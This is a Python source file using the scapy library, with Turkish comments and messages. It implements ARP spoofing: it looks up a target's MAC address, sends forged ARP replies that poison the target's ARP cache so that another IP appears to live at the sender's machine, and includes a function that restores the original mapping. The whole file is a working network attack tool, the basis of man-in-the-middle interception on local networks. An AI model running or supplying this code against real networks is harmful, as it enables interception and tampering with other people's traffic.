from scapy.all import ARP, send, srp, Ether
import time

def get_mac(ip):
    """Verilen IP adresi için MAC adresini alır."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def arp_spoof(target_ip, spoof_ip, interface='eth0'):
    """Hedef IP adresini kötü niyetli IP adresi ile spoof eder."""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"MAC adresi bulunamadı: {target_ip}")
        return
    
    print(f"Target MAC: {target_mac}")

    arp_response = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
    
    print(f"Spoofing {target_ip} ile {spoof_ip}")
    send(arp_response, iface=interface, verbose=False)

def restore_arp(target_ip, original_ip, interface='eth0'):
    """Hedef IP adresini eski IP adresi ile geri yükler."""
    target_mac = get_mac(target_ip)
    original_mac = get_mac(original_ip)
    if not target_mac or not original_mac:
        print(f"MAC adresleri bulunamadı: {target_ip} veya {original_ip}")
        return
    
    arp_response = ARP(op=2, psrc=original_ip, pdst=target_ip, hwdst=target_mac, hwsrc=original_mac)
    send(arp_response, iface=interface, count=4, verbose=False)
    print(f"ARP tablosu {target_ip} için geri yüklendi.")